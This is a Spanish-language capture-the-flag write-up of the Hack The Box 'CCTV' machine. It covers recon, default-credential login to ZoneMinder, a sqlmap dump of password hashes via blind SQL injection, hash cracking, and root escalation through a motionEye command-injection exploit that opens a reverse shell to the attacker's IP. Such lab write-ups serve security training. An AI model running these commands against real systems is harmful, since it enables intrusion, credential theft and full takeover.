
# Hack The Box: CCTV - Writeup Técnico

## 1. Reconocimiento Inicial

La evaluación comenzó con un escaneo de puertos utilizando Nmap para identificar la superficie de ataque expuesta en la máquina objetivo.

```bash
nmap -p- --min-rate 5000 -sS 10.129.119.247
```

Resultados relevantes:
* **22/tcp** - SSH
* **80/tcp** - HTTP (Apache 2.4.58)

Se configuró la resolución local agregando la IP al archivo `/etc/hosts` apuntando al dominio `cctv.htb`. La navegación web reveló una página de SecureVision. Mediante enumeración manual de directorios, se descubrió un panel de administración en la ruta `/zm/`, correspondiente a **ZoneMinder v1.37.63**. Se logró acceso inicial a la interfaz web utilizando credenciales por defecto (`admin:admin`).

## 2. Intentos Fallidos y Análisis de Restricciones (Rabbit Holes)

Antes de dar con el vector de compromiso correcto, se evaluaron e intentaron múltiples vías de explotación documentadas para ZoneMinder que resultaron inviables debido a configuraciones específicas del entorno:

* **Fallo 1: Unauthenticated RCE en Snapshots (CVE-2023-26035)**
Se intentó ejecutar un script público en Python para lograr ejecución de código sin autenticación. El ataque fracasó porque la vulnerabilidad afecta a versiones previas a la 1.37.33; el objetivo estaba parchado en su versión 1.37.63.

* **Fallo 2: Authenticated RCE vía Filtros Web y Tuberías Bash**
Se intentó explotar la función de filtros del sistema mediante peticiones `curl` y la interfaz gráfica, inyectando un comando en Base64 (`AutoExecuteCmd`). El ataque fue bloqueado por múltiples factores:
  1. Rotación estricta y expiración de los tokens `__csrf_magic`.
  2. Problemas con el manejo de pseudo-terminales al usar tuberías (`|`) en comandos de bash interactivos.
  3. **Restricción de diseño:** La base de datos de ZoneMinder no contenía eventos previos (0 matches). Dado que el filtro opera como un bucle sobre eventos existentes, el comando nunca se disparaba.
  4. Los intentos de crear un monitor falso usando `/dev/zero` o archivos locales como origen para forzar un evento de grabación fallaron; el proceso `zmc` no lograba iniciar la captura, manteniendo el monitor inoperativo (estado rojo) por restricciones intencionales en el servidor.

* **Fallo 3: Extracción SQL mediante Script Python (Time-Based)**
Se probó un exploit personalizado en Python para inyección SQL basada en tiempo. Aunque la vulnerabilidad existía, la herramienta evaluaba carácter por carácter midiendo los tiempos de respuesta del servidor. La latencia del entorno hizo que la extracción tomara horas para un solo registro, demostrando ser inviable en la práctica.

## 3. Acceso Inicial (El Vector Correcto - CVE-2024-51482)

El análisis de las restricciones confirmó que el RCE por filtros estaba bloqueado a nivel de diseño en esta máquina, orientando el ataque hacia la Inyección SQL Ciega (CVE-2024-51482). El objetivo era extraer credenciales directamente.

Utilizando la sesión autenticada (`ZMSESSID`) obtenida desde el navegador, se configuró `sqlmap` para apuntar directamente a la tabla `Users` y optimizar la extracción, evadiendo la lentitud de los scripts manuales:

```bash
sqlmap -u "[http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1](http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1)" \
-D zm -T Users -C Username,Password --dump --batch \
--dbms=MySQL --technique=T \
--cookie="ZMSESSID=TU_COOKIE_AQUI" \
--time-sec=2
```

La herramienta logró extraer los registros de la base de datos, revelando las contraseñas cifradas en formato bcrypt para los usuarios `superadmin`, `admin` y `mark`.

## 4. Cracking Criptográfico y Acceso SSH

Se aisló el hash del usuario `mark` en un archivo de texto (`hash.txt`) para realizar un ataque de fuerza bruta offline utilizando John the Ripper y el diccionario `rockyou.txt`:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

El ataque recuperó la contraseña en texto claro en minutos. Utilizando estas credenciales, se estableció una sesión SSH, logrando el acceso inicial (foothold) al sistema y la captura de la bandera `user.txt`.

```bash
ssh mark@cctv.htb
```

## 5. Escalamiento de Privilegios (Root)

Durante la fase de post-explotación local, la enumeración de puertos (`ss -tuln`) y procesos reveló un segundo servicio de videovigilancia llamado **motionEye**, ejecutándose con privilegios de `root` pero restringido a la interfaz local (`127.0.0.1:8765`).

La inspección de los archivos de configuración en el sistema expuso el hash de la contraseña administrativa de motionEye. Para interactuar con el servicio, se implementó un reenvío de puertos locales (Local Port Forwarding) a través de la sesión SSH existente.

Con acceso a la API local de motionEye y la contraseña descubierta, se explotó la vulnerabilidad de inyección de comandos **CVE-2025-60787**. Se preparó un listener en la máquina atacante y se ejecutó el exploit:

```bash
python3 CVE-2025-60787.py revshell \
--url '[http://127.0.0.1:8765](http://127.0.0.1:8765)' \
--user 'admin' \
--password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
-i 10.10.14.240 \
--port 4444
```

El exploit inyectó exitosamente el payload durante la recarga de configuración de motionEye. La reverse shell se recibió como el usuario `root`, permitiendo el control total de la infraestructura y la lectura de la bandera final.

```bash
root@cctv:~# whoami
root
root@cctv:~# cat /root/root.txt
```
```